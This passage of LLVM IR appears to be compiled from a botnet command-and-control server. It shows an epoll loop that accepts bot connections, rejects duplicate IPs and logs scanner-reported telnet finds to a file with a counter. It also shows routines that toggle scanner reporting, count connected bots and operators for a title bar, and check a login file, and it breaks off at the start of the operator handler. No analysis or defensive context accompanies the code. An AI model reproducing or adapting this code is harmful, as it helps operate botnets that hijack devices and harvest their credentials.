  %25 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %26 = call i32 @epoll_wait(i32 noundef %24, %struct.epoll_event* noundef %25, i32 noundef 1000000, i32 noundef -1)
  store i32 %26, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %27

27:                                               ; preds = %294, %23
  %28 = load i32, i32* %7, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %297

31:                                               ; preds = %27
  %32 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i64 %34
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 1
  %38 = and i32 %37, 8
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %58, label %40

40:                                               ; preds = %31
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i64 %43
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 1
  %47 = and i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %58, label %49

49:                                               ; preds = %40
  %50 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %77, label %58

58:                                               ; preds = %49, %40, %31
  %59 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  %65 = load i32, i32* %64, align 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %67, i32 0, i32 1
  store i8 0, i8* %68, align 4
  %69 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = call i32 @close(i32 noundef %75)
  br label %294

77:                                               ; preds = %49
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = icmp eq i32 %78, %85
  br i1 %86, label %87, label %186

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %178, %154, %151, %87
  store i32 16, i32* %9, align 4
  %89 = load volatile i32, i32* @listenFD, align 4
  %90 = call i32 @accept(i32 noundef %89, %struct.sockaddr* noundef %8, i32* noundef %9)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %101, label %97

97:                                               ; preds = %93
  %98 = call i32* @__errno_location() #10
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 11
  br i1 %100, label %101, label %102

101:                                              ; preds = %97, %93
  br label %185

102:                                              ; preds = %97
  call void @perror(i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  br label %185

103:                                              ; preds = %88
  %104 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 2
  %106 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 2
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %110, i32 0, i32 0
  store i32 %107, i32* %111, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %112

112:                                              ; preds = %141, %103
  %113 = load i32, i32* %11, align 4
  %114 = icmp slt i32 %113, 1000000
  br i1 %114, label %115, label %144

115:                                              ; preds = %112
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %117
  %119 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %118, i32 0, i32 1
  %120 = load i8, i8* %119, align 4
  %121 = icmp ne i8 %120, 0
  br i1 %121, label %122, label %126

122:                                              ; preds = %115
  %123 = load i32, i32* %11, align 4
  %124 = load i32, i32* %10, align 4
  %125 = icmp eq i32 %123, %124
  br i1 %125, label %126, label %127

126:                                              ; preds = %122, %115
  br label %141

127:                                              ; preds = %122
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = load i32, i32* %10, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 8
  %138 = icmp eq i32 %132, %137
  br i1 %138, label %139, label %140

139:                                              ; preds = %127
  store i32 1, i32* %12, align 4
  br label %144

140:                                              ; preds = %127
  br label %141

141:                                              ; preds = %140, %126
  %142 = load i32, i32* %11, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %11, align 4
  br label %112, !llvm.loop !12

144:                                              ; preds = %139, %112
  %145 = load i32, i32* %12, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %157

147:                                              ; preds = %144
  %148 = load i32, i32* %10, align 4
  %149 = call i64 @send(i32 noundef %148, i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0), i64 noundef 13, i32 noundef 16384)
  %150 = icmp eq i64 %149, -1
  br i1 %150, label %151, label %154

151:                                              ; preds = %147
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 noundef %152)
  br label %88

154:                                              ; preds = %147
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @close(i32 noundef %155)
  br label %88

157:                                              ; preds = %144
  %158 = load i32, i32* %10, align 4
  %159 = call i32 @make_socket_non_blocking(i32 noundef %158)
  store i32 %159, i32* %5, align 4
  %160 = load i32, i32* %5, align 4
  %161 = icmp eq i32 %160, -1
  br i1 %161, label %162, label %165

162:                                              ; preds = %157
  %163 = load i32, i32* %10, align 4
  %164 = call i32 @close(i32 noundef %163)
  br label %185

165:                                              ; preds = %157
  %166 = load i32, i32* %10, align 4
  %167 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %168 = bitcast %union.epoll_data* %167 to i32*
  store i32 %166, i32* %168, align 1
  %169 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %169, align 1
  %170 = load volatile i32, i32* @epollFD, align 4
  %171 = load i32, i32* %10, align 4
  %172 = call i32 @epoll_ctl(i32 noundef %170, i32 noundef 1, i32 noundef %171, %struct.epoll_event* noundef %3) #9
  store i32 %172, i32* %5, align 4
  %173 = load i32, i32* %5, align 4
  %174 = icmp eq i32 %173, -1
  br i1 %174, label %175, label %178

175:                                              ; preds = %165
  call void @perror(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  %176 = load i32, i32* %10, align 4
  %177 = call i32 @close(i32 noundef %176)
  br label %185

178:                                              ; preds = %165
  %179 = load i32, i32* %10, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %180
  %182 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %181, i32 0, i32 1
  store i8 1, i8* %182, align 4
  %183 = load i32, i32* %10, align 4
  %184 = call i64 @send(i32 noundef %183, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i64 0, i64 0), i64 noundef 14, i32 noundef 16384)
  br label %88

185:                                              ; preds = %175, %162, %102, %101
  br label %294

186:                                              ; preds = %77
  %187 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %188 = load i32, i32* %7, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %187, i64 %189
  %191 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %190, i32 0, i32 1
  %192 = bitcast %union.epoll_data* %191 to i32*
  %193 = load i32, i32* %192, align 1
  store i32 %193, i32* %13, align 4
  %194 = load i32, i32* %13, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %195
  store %struct.clientdata_t* %196, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %197 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %198 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %197, i32 0, i32 1
  store i8 1, i8* %198, align 4
  br label %199

199:                                              ; preds = %290, %186
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %200, i8 0, i64 2048, i1 false)
  br label %201

201:                                              ; preds = %265, %264, %257, %249, %233, %227, %199
  %202 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %202, i8 0, i64 2048, i1 false)
  %203 = icmp ne i8* %202, null
  br i1 %203, label %204, label %210

204:                                              ; preds = %201
  %205 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %206 = load i32, i32* %13, align 4
  %207 = call i32 @fdgets(i8* noundef %205, i32 noundef 2048, i32 noundef %206)
  %208 = sext i32 %207 to i64
  store i64 %208, i64* %16, align 8
  %209 = icmp sgt i64 %208, 0
  br label %210

210:                                              ; preds = %204, %201
  %211 = phi i1 [ false, %201 ], [ %209, %204 ]
  br i1 %211, label %212, label %268

212:                                              ; preds = %210
  %213 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %214 = call i8* @strstr(i8* noundef %213, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #8
  %215 = icmp eq i8* %214, null
  br i1 %215, label %216, label %217

216:                                              ; preds = %212
  store i32 1, i32* %15, align 4
  br label %268

217:                                              ; preds = %212
  %218 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* noundef %218)
  %219 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %220 = call i32 @strcmp(i8* noundef %219, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %222, label %228

222:                                              ; preds = %217
  %223 = load i32, i32* %13, align 4
  %224 = call i64 @send(i32 noundef %223, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i64 noundef 5, i32 noundef 16384)
  %225 = icmp eq i64 %224, -1
  br i1 %225, label %226, label %227

226:                                              ; preds = %222
  store i32 1, i32* %15, align 4
  br label %268

227:                                              ; preds = %222
  br label %201, !llvm.loop !13

228:                                              ; preds = %217
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %230 = call i8* @strstr(i8* noundef %229, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0)) #8
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %232 = icmp eq i8* %230, %231
  br i1 %232, label %233, label %244

233:                                              ; preds = %228
  %234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %235 = call i8* @strstr(i8* noundef %234, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0)) #8
  %236 = getelementptr inbounds i8, i8* %235, i64 7
  store i8* %236, i8** %18, align 8
  %237 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %238 = load i8*, i8** %18, align 8
  %239 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %237, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* noundef %238)
  %240 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %241 = call i32 @fflush(%struct._IO_FILE* noundef %240)
  %242 = load volatile i32, i32* @TELFound, align 4
  %243 = add nsw i32 %242, 1
  store volatile i32 %243, i32* @TELFound, align 4
  br label %201, !llvm.loop !13

244:                                              ; preds = %228
  %245 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %246 = call i8* @strstr(i8* noundef %245, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0)) #8
  %247 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %248 = icmp eq i8* %246, %247
  br i1 %248, label %249, label %252

249:                                              ; preds = %244
  %250 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %251 = call i8* @strstr(i8* noundef %250, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0)) #8
  store i8* %251, i8** %19, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %201, !llvm.loop !13

252:                                              ; preds = %244
  %253 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %254 = call i8* @strstr(i8* noundef %253, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i64 0, i64 0)) #8
  %255 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %256 = icmp eq i8* %254, %255
  br i1 %256, label %257, label %260

257:                                              ; preds = %252
  %258 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %259 = call i8* @strstr(i8* noundef %258, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i64 0, i64 0)) #8
  store i8* %259, i8** %20, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %201, !llvm.loop !13

260:                                              ; preds = %252
  %261 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %262 = call i32 @strcmp(i8* noundef %261, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0)) #8
  %263 = icmp eq i32 %262, 0
  br i1 %263, label %264, label %265

264:                                              ; preds = %260
  br label %201, !llvm.loop !13

265:                                              ; preds = %260
  %266 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %267 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i64 0, i64 0), i8* noundef %266)
  br label %201, !llvm.loop !13

268:                                              ; preds = %226, %216, %210
  %269 = load i64, i64* %16, align 8
  %270 = icmp eq i64 %269, -1
  br i1 %270, label %271, label %277

271:                                              ; preds = %268
  %272 = call i32* @__errno_location() #10
  %273 = load i32, i32* %272, align 4
  %274 = icmp ne i32 %273, 11
  br i1 %274, label %275, label %276

275:                                              ; preds = %271
  store i32 1, i32* %15, align 4
  br label %276

276:                                              ; preds = %275, %271
  br label %291

277:                                              ; preds = %268
  %278 = load i64, i64* %16, align 8
  %279 = icmp eq i64 %278, 0
  br i1 %279, label %280, label %281

280:                                              ; preds = %277
  store i32 1, i32* %15, align 4
  br label %291

281:                                              ; preds = %277
  br label %282

282:                                              ; preds = %281
  %283 = load i32, i32* %15, align 4
  %284 = icmp ne i32 %283, 0
  br i1 %284, label %285, label %290

285:                                              ; preds = %282
  %286 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %287 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %286, i32 0, i32 1
  store i8 0, i8* %287, align 4
  %288 = load i32, i32* %13, align 4
  %289 = call i32 @close(i32 noundef %288)
  br label %290

290:                                              ; preds = %285, %282
  br label %199

291:                                              ; preds = %280, %276
  br label %292

292:                                              ; preds = %291
  br label %293

293:                                              ; preds = %292
  br label %294

294:                                              ; preds = %293, %185, %58
  %295 = load i32, i32* %7, align 4
  %296 = add nsw i32 %295, 1
  store i32 %296, i32* %7, align 4
  br label %27, !llvm.loop !14

297:                                              ; preds = %27
  br label %23
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64 noundef, i64 noundef) #3

declare i32 @epoll_wait(i32 noundef, %struct.epoll_event* noundef, i32 noundef, i32 noundef) #1

declare i32 @close(i32 noundef) #1

declare i32 @accept(i32 noundef, %struct.sockaddr* noundef, i32* noundef) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 noundef %6, i32 noundef 3, i32 noundef 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 noundef %14, i32 noundef 4, i32 noundef %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32 noundef, i32 noundef, i32 noundef, %struct.epoll_event* noundef) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8* noundef, i8* noundef) #2

declare i32 @fprintf(%struct._IO_FILE* noundef, i8* noundef, ...) #1

declare i32 @fflush(%struct._IO_FILE* noundef) #1

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @TitleWriter(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %20, %1
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @BotsConnected()
  %11 = load volatile i32, i32* @OperatorsConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %9, i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.17, i64 0, i64 0), i32 noundef 27, i32 noundef %10, i32 noundef %11, i32 noundef 7) #9
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = call i64 @strlen(i8* noundef %15) #8
  %17 = call i64 @send(i32 noundef %13, i8* noundef %14, i64 noundef %16, i32 noundef 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %7
  ret i8* null

20:                                               ; preds = %7
  %21 = call i32 @sleep(i32 noundef 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* noundef, i8* noundef, ...) #3

declare i32 @sleep(i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @Find_Login(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* noundef %14, i32 noundef 512, %struct._IO_FILE* noundef %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* noundef %19, i8* noundef %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* noundef %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8* noundef, i8* noundef) #1

declare i8* @fgets(i8* noundef, i32 noundef, %struct._IO_FILE* noundef) #1

declare i32 @fclose(%struct._IO_FILE* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @BotWorker(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca [2048 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca [80 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [80 x i8], align 16
  %27 = alloca [2048 x i8], align 16
  %28 = alloca [80 x i8], align 16
  %29 = alloca [80 x i8], align 16
  %30 = alloca [80 x i8], align 16
  %31 = alloca [80 x i8], align 16
  %32 = alloca [80 x i8], align 16
  %33 = alloca [80 x i8], align 16
  %34 = alloca [80 x i8], align 16
  %35 = alloca [80 x i8], align 16
  %36 = alloca [80 x i8], align 16
  %37 = alloca [80 x i8], align 16
  %38 = alloca [80 x i8], align 16
  %39 = alloca [80 x i8], align 16
  %40 = alloca [80 x i8], align 16
  %41 = alloca [80 x i8], align 16
  %42 = alloca [80 x i8], align 16
  %43 = alloca [80 x i8], align 16
  %44 = alloca [80 x i8], align 16
  %45 = alloca [80 x i8], align 16
  %46 = alloca [80 x i8], align 16
  %47 = alloca [80 x i8], align 16
  %48 = alloca [80 x i8], align 16
  %49 = alloca [80 x i8], align 16
  %50 = alloca [80 x i8], align 16
  %51 = alloca [80 x i8], align 16
  %52 = alloca [80 x i8], align 16
  %53 = alloca [2048 x i8], align 16
  %54 = alloca [2048 x i8], align 16
  %55 = alloca [2048 x i8], align 16
  %56 = alloca %struct._IO_FILE*, align 8
  %57 = alloca i64, align 8
  %58 = alloca %struct.tm*, align 8
  %59 = alloca [50 x i8], align 16
  %60 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %61 = load i8*, i8** %3, align 8
  %62 = ptrtoint i8* %61 to i32
  store i32 %62, i32* %4, align 4
  %63 = load volatile i32, i32* @OperatorsConnected, align 4
  %64 = add nsw i32 %63, 1
  store volatile i32 %64, i32* @OperatorsConnected, align 4
  %65 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %65, i8 0, i64 2048, i1 false)
  %66 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %66, i8 0, i64 2048, i1 false)
  %67 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %67, i8 0, i64 2048, i1 false)
